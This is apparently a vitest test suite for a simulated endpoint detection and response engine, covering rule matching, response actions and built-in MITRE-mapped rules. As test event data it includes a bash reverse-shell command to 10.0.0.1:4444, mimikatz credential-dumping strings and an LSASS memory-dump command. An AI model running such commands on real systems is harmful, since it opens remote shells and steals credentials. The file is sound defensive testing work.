import { describe, it, expect, beforeEach } from 'vitest';
import { createEDREngine, createBuiltinEDRRules } from '../../../src/lib/edr';
import type { EDREngine, EDRDetectionRule, EDREvent } from '../../../src/lib/edr';

describe('EDR Engine', () => {
    let edr: EDREngine;

    beforeEach(() => {
        edr = createEDREngine();
    });

    // ── Rule Management ──────────────────────────────────────

    it('starts with no rules', () => {
        expect(edr.getRules()).toHaveLength(0);
    });

    it('adds and retrieves rules', () => {
        const rule: EDRDetectionRule = {
            id: 'r1', name: 'Test Rule', description: 'desc',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'malware.exe' }],
            mitreTechnique: 'T1059', mitreTactic: 'execution',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        };
        edr.addRule(rule);
        expect(edr.getRules()).toHaveLength(1);
        expect(edr.getRules()[0]!.id).toBe('r1');
    });

    it('removes rules', () => {
        edr.addRule({
            id: 'r1', name: 'Test', description: '', severity: 'low', logic: 'all',
            conditions: [], mitreTechnique: '', mitreTactic: '',
            responseActions: [], enabled: true, falsePositiveRate: 'none',
        });
        expect(edr.removeRule('r1')).toBe(true);
        expect(edr.getRules()).toHaveLength(0);
        expect(edr.removeRule('nonexistent')).toBe(false);
    });

    it('enables and disables rules', () => {
        edr.addRule({
            id: 'r1', name: 'Test', description: '', severity: 'low', logic: 'all',
            conditions: [], mitreTechnique: '', mitreTactic: '',
            responseActions: [], enabled: true, falsePositiveRate: 'none',
        });
        expect(edr.setRuleEnabled('r1', false)).toBe(true);
        expect(edr.getRules()[0]!.enabled).toBe(false);
        expect(edr.setRuleEnabled('r1', true)).toBe(true);
        expect(edr.getRules()[0]!.enabled).toBe(true);
        expect(edr.setRuleEnabled('nonexistent', true)).toBe(false);
    });

    // ── Event Ingestion & Detection ──────────────────────────

    function makeEvent(overrides: Partial<Omit<EDREvent, 'id'>> = {}): Omit<EDREvent, 'id'> {
        return {
            tick: 1, machine: 'ws01', type: 'process_create',
            pid: 1234, processName: 'cmd.exe', parentPid: 100, parentName: 'explorer.exe',
            user: 'admin', commandLine: 'cmd.exe /c dir',
            ...overrides,
        };
    }

    it('ingests events with no rules and produces no alerts', () => {
        const alerts = edr.ingestEvent(makeEvent());
        expect(alerts).toHaveLength(0);
    });

    it('detects events matching equals condition', () => {
        edr.addRule({
            id: 'r1', name: 'Detect cmd', description: '',
            severity: 'medium', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'cmd.exe' }],
            mitreTechnique: 'T1059', mitreTactic: 'execution',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        const alerts = edr.ingestEvent(makeEvent());
        expect(alerts).toHaveLength(1);
        expect(alerts[0]!.ruleName).toBe('Detect cmd');
        expect(alerts[0]!.severity).toBe('medium');
    });

    it('does not alert on non-matching events', () => {
        edr.addRule({
            id: 'r1', name: 'Detect PS', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'powershell.exe' }],
            mitreTechnique: 'T1059.001', mitreTactic: 'execution',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        const alerts = edr.ingestEvent(makeEvent({ processName: 'notepad.exe' }));
        expect(alerts).toHaveLength(0);
    });

    it('disabled rules do not fire', () => {
        edr.addRule({
            id: 'r1', name: 'Disabled', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'cmd.exe' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: false, falsePositiveRate: 'none',
        });
        expect(edr.ingestEvent(makeEvent())).toHaveLength(0);
    });

    // ── Condition Operators ──────────────────────────────────

    it('contains operator matches substring', () => {
        edr.addRule({
            id: 'r1', name: 'Contains', description: '',
            severity: 'medium', logic: 'all',
            conditions: [{ field: 'commandLine', operator: 'contains', value: 'mimikatz' }],
            mitreTechnique: 'T1003', mitreTactic: 'credential-access',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'none',
        });
        expect(edr.ingestEvent(makeEvent({ commandLine: 'C:\\tools\\mimikatz.exe sekurlsa' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ commandLine: 'notepad.exe' }))).toHaveLength(0);
    });

    it('startsWith operator', () => {
        edr.addRule({
            id: 'r1', name: 'Starts', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'commandLine', operator: 'startsWith', value: 'powershell' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        expect(edr.ingestEvent(makeEvent({ commandLine: 'PowerShell -enc abc' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ commandLine: 'cmd /c powershell' }))).toHaveLength(0);
    });

    it('endsWith operator', () => {
        edr.addRule({
            id: 'r1', name: 'Ends', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'filePath', operator: 'endsWith', value: '.exe' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        expect(edr.ingestEvent(makeEvent({ filePath: '/tmp/payload.exe' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ filePath: '/tmp/script.ps1' }))).toHaveLength(0);
    });

    it('regex operator', () => {
        edr.addRule({
            id: 'r1', name: 'Regex', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'commandLine', operator: 'regex', value: '-[eE]nc' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        expect(edr.ingestEvent(makeEvent({ commandLine: 'powershell -enc base64data' }))).toHaveLength(1);
    });

    it('in operator matches list', () => {
        edr.addRule({
            id: 'r1', name: 'In', description: '',
            severity: 'medium', logic: 'all',
            conditions: [{ field: 'processName', operator: 'in', value: ['bash', 'sh', 'cmd.exe'] }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        expect(edr.ingestEvent(makeEvent({ processName: 'bash' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ processName: 'notepad.exe' }))).toHaveLength(0);
    });

    it('notEquals operator', () => {
        edr.addRule({
            id: 'r1', name: 'NotEq', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'user', operator: 'notEquals', value: 'SYSTEM' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'high',
        });
        expect(edr.ingestEvent(makeEvent({ user: 'admin' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ user: 'SYSTEM' }))).toHaveLength(0);
    });

    // ── Logic: all vs any ────────────────────────────────────

    it('all logic requires every condition to match', () => {
        edr.addRule({
            id: 'r1', name: 'All', description: '',
            severity: 'high', logic: 'all',
            conditions: [
                { field: 'processName', operator: 'equals', value: 'powershell.exe' },
                { field: 'commandLine', operator: 'contains', value: '-enc' },
            ],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        // Both match
        expect(edr.ingestEvent(makeEvent({ processName: 'powershell.exe', commandLine: 'powershell -enc abc' }))).toHaveLength(1);
        // Only one matches
        expect(edr.ingestEvent(makeEvent({ processName: 'powershell.exe', commandLine: 'powershell -version' }))).toHaveLength(0);
    });

    it('any logic requires at least one condition to match', () => {
        edr.addRule({
            id: 'r1', name: 'Any', description: '',
            severity: 'critical', logic: 'any',
            conditions: [
                { field: 'commandLine', operator: 'contains', value: 'mimikatz' },
                { field: 'commandLine', operator: 'contains', value: 'sekurlsa' },
            ],
            mitreTechnique: 'T1003', mitreTactic: 'credential-access',
            responseActions: ['alert', 'kill_process'], enabled: true, falsePositiveRate: 'none',
        });
        expect(edr.ingestEvent(makeEvent({ commandLine: 'sekurlsa::logonpasswords' }))).toHaveLength(1);
        expect(edr.ingestEvent(makeEvent({ commandLine: 'notepad.exe' }))).toHaveLength(0);
    });

    // ── Response Actions ─────────────────────────────────────

    it('isolate_host response action isolates the host', () => {
        edr.addRule({
            id: 'r1', name: 'Isolate', description: '',
            severity: 'critical', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'malware.exe' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert', 'isolate_host'], enabled: true, falsePositiveRate: 'none',
        });
        edr.ingestEvent(makeEvent({ processName: 'malware.exe', machine: 'victim01' }));
        const status = edr.getHostStatus('victim01');
        expect(status.isolated).toBe(true);
    });

    it('kill_process response action blocks the process', () => {
        edr.addRule({
            id: 'r1', name: 'Kill', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'nc' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['kill_process'], enabled: true, falsePositiveRate: 'low',
        });
        edr.ingestEvent(makeEvent({ processName: 'nc', machine: 'ws01' }));
        const status = edr.getHostStatus('ws01');
        expect(status.blockedProcesses).toContain('nc');
    });

    it('quarantine_file response action quarantines the file', () => {
        edr.addRule({
            id: 'r1', name: 'Quarantine', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'file_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['quarantine_file'], enabled: true, falsePositiveRate: 'low',
        });
        edr.ingestEvent(makeEvent({ type: 'file_create', filePath: '/tmp/evil.exe', machine: 'ws01' }));
        const status = edr.getHostStatus('ws01');
        expect(status.quarantinedFiles).toContain('/tmp/evil.exe');
    });

    it('suspend_user response action suspends the user', () => {
        edr.addRule({
            id: 'r1', name: 'Suspend', description: '',
            severity: 'critical', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'mimikatz.exe' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['suspend_user'], enabled: true, falsePositiveRate: 'none',
        });
        edr.ingestEvent(makeEvent({ processName: 'mimikatz.exe', user: 'attacker', machine: 'ws01' }));
        const status = edr.getHostStatus('ws01');
        expect(status.suspendedUsers).toContain('attacker');
    });

    // ── Alert Management ─────────────────────────────────────

    it('getAlerts returns all alerts', () => {
        edr.addRule({
            id: 'r1', name: 'Catch All', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'high',
        });
        edr.ingestEvent(makeEvent());
        edr.ingestEvent(makeEvent({ pid: 5678 }));
        expect(edr.getAlerts()).toHaveLength(2);
    });

    it('getAlertsBySeverity filters correctly', () => {
        edr.addRule({
            id: 'r1', name: 'High', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'cmd.exe' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        edr.addRule({
            id: 'r2', name: 'Low', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'high',
        });
        edr.ingestEvent(makeEvent());
        expect(edr.getAlertsBySeverity('high')).toHaveLength(1);
        expect(edr.getAlertsBySeverity('low')).toHaveLength(1);
        expect(edr.getAlertsBySeverity('critical')).toHaveLength(0);
    });

    it('getAlertsByMachine filters correctly', () => {
        edr.addRule({
            id: 'r1', name: 'Rule', description: '',
            severity: 'medium', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        edr.ingestEvent(makeEvent({ machine: 'ws01' }));
        edr.ingestEvent(makeEvent({ machine: 'ws02' }));
        expect(edr.getAlertsByMachine('ws01')).toHaveLength(1);
        expect(edr.getAlertsByMachine('ws02')).toHaveLength(1);
        expect(edr.getAlertsByMachine('ws03')).toHaveLength(0);
    });

    it('investigateAlert marks alert as investigated', () => {
        edr.addRule({
            id: 'r1', name: 'Rule', description: '',
            severity: 'medium', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        edr.ingestEvent(makeEvent());
        const alertId = edr.getAlerts()[0]!.id;
        expect(edr.investigateAlert(alertId, false)).toBe(true);
        expect(edr.getAlerts()[0]!.investigated).toBe(true);
        expect(edr.getAlerts()[0]!.falsePositive).toBe(false);
    });

    it('investigateAlert marks false positive', () => {
        edr.addRule({
            id: 'r1', name: 'Rule', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'high',
        });
        edr.ingestEvent(makeEvent());
        const alertId = edr.getAlerts()[0]!.id;
        expect(edr.investigateAlert(alertId, true)).toBe(true);
        expect(edr.getAlerts()[0]!.falsePositive).toBe(true);
    });

    it('investigateAlert returns false for unknown alert', () => {
        expect(edr.investigateAlert('nonexistent', false)).toBe(false);
    });

    it('resetAlerts clears all alerts', () => {
        edr.addRule({
            id: 'r1', name: 'Rule', description: '',
            severity: 'low', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        edr.ingestEvent(makeEvent());
        edr.ingestEvent(makeEvent());
        expect(edr.getAlerts()).toHaveLength(2);
        edr.resetAlerts();
        expect(edr.getAlerts()).toHaveLength(0);
    });

    // ── Host Management ──────────────────────────────────────

    it('isolateHost and unisolateHost', () => {
        edr.isolateHost('ws01');
        expect(edr.getHostStatus('ws01').isolated).toBe(true);
        edr.unisolateHost('ws01');
        expect(edr.getHostStatus('ws01').isolated).toBe(false);
    });

    it('getHosts returns all monitored hosts', () => {
        edr.ingestEvent(makeEvent({ machine: 'ws01' }));
        edr.ingestEvent(makeEvent({ machine: 'ws02' }));
        const hosts = edr.getHosts();
        expect(hosts.length).toBeGreaterThanOrEqual(2);
        const names = hosts.map(h => h.machine);
        expect(names).toContain('ws01');
        expect(names).toContain('ws02');
    });

    it('host status includes agent version and lastSeen', () => {
        edr.ingestEvent(makeEvent({ machine: 'ws01', tick: 42 }));
        const status = edr.getHostStatus('ws01');
        expect(status.agentVersion).toBeTruthy();
        expect(status.lastSeen).toBe(42);
    });

    // ── Built-in Rules ───────────────────────────────────────

    it('createBuiltinEDRRules returns 8 rules', () => {
        const rules = createBuiltinEDRRules();
        expect(rules).toHaveLength(8);
        for (const rule of rules) {
            expect(rule.id).toBeTruthy();
            expect(rule.mitreTechnique).toBeTruthy();
            expect(rule.enabled).toBe(true);
        }
    });

    it('builtin PowerShell rule detects encoded commands', () => {
        const rules = createBuiltinEDRRules();
        for (const r of rules) edr.addRule(r);
        const alerts = edr.ingestEvent(makeEvent({
            processName: 'powershell.exe',
            commandLine: 'powershell.exe -enc ZQBjAGgAbwA=',
        }));
        const psAlert = alerts.find(a => a.ruleId === 'edr-001');
        expect(psAlert).toBeDefined();
        expect(psAlert!.severity).toBe('high');
    });

    it('builtin LSASS rule detects memory injection targeting lsass', () => {
        const rules = createBuiltinEDRRules();
        for (const r of rules) edr.addRule(r);
        const alerts = edr.ingestEvent(makeEvent({
            type: 'memory_injection',
            processName: 'procdump.exe',
            commandLine: 'procdump -ma lsass.exe dump.dmp',
        }));
        const lsassAlert = alerts.find(a => a.ruleId === 'edr-002');
        expect(lsassAlert).toBeDefined();
        expect(lsassAlert!.severity).toBe('critical');
    });

    it('builtin Mimikatz rule detects via any-logic', () => {
        const rules = createBuiltinEDRRules();
        for (const r of rules) edr.addRule(r);
        const alerts = edr.ingestEvent(makeEvent({
            commandLine: 'sekurlsa::logonpasswords',
        }));
        const mimiAlert = alerts.find(a => a.ruleId === 'edr-004');
        expect(mimiAlert).toBeDefined();
        expect(mimiAlert!.severity).toBe('critical');
    });

    it('builtin reverse shell rule detects shell network connections', () => {
        const rules = createBuiltinEDRRules();
        for (const r of rules) edr.addRule(r);
        const alerts = edr.ingestEvent(makeEvent({
            type: 'network_connect',
            processName: 'bash',
            commandLine: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        }));
        const revShell = alerts.find(a => a.ruleId === 'edr-003');
        expect(revShell).toBeDefined();
        expect(revShell!.severity).toBe('critical');
    });

    // ── Stats ────────────────────────────────────────────────

    it('getStats returns accurate counts', () => {
        edr.addRule({
            id: 'r1', name: 'Rule', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'type', operator: 'equals', value: 'process_create' }],
            mitreTechnique: '', mitreTactic: '',
            responseActions: ['alert'], enabled: true, falsePositiveRate: 'low',
        });
        edr.addRule({
            id: 'r2', name: 'Disabled', description: '',
            severity: 'low', logic: 'all',
            conditions: [], mitreTechnique: '', mitreTactic: '',
            responseActions: [], enabled: false, falsePositiveRate: 'none',
        });
        edr.ingestEvent(makeEvent({ machine: 'ws01' }));
        edr.ingestEvent(makeEvent({ machine: 'ws02' }));
        edr.ingestEvent(makeEvent({ machine: 'ws01', type: 'file_create' }));

        const alertId = edr.getAlerts()[0]!.id;
        edr.investigateAlert(alertId, true);

        edr.isolateHost('ws01');

        const stats = edr.getStats();
        expect(stats.totalEvents).toBe(3);
        expect(stats.totalAlerts).toBe(2);
        expect(stats.totalRules).toBe(2);
        expect(stats.enabledRules).toBe(1);
        expect(stats.hostsMonitored).toBe(2);
        expect(stats.hostsIsolated).toBe(1);
        expect(stats.investigatedAlerts).toBe(1);
        expect(stats.falsePositives).toBe(1);
    });

    // ── Alert Structure ──────────────────────────────────────

    it('alerts contain correct MITRE mapping and event reference', () => {
        edr.addRule({
            id: 'r1', name: 'MITRE Test', description: '',
            severity: 'high', logic: 'all',
            conditions: [{ field: 'processName', operator: 'equals', value: 'cmd.exe' }],
            mitreTechnique: 'T1059.003', mitreTactic: 'execution',
            responseActions: ['alert', 'collect_forensics'], enabled: true, falsePositiveRate: 'low',
        });
        const alerts = edr.ingestEvent(makeEvent());
        expect(alerts[0]!.mitreTechnique).toBe('T1059.003');
        expect(alerts[0]!.mitreTactic).toBe('execution');
        expect(alerts[0]!.event.processName).toBe('cmd.exe');
        expect(alerts[0]!.responsesTaken).toContain('alert');
        expect(alerts[0]!.responsesTaken).toContain('collect_forensics');
        expect(alerts[0]!.investigated).toBe(false);
        expect(alerts[0]!.falsePositive).toBe(false);
    });
});
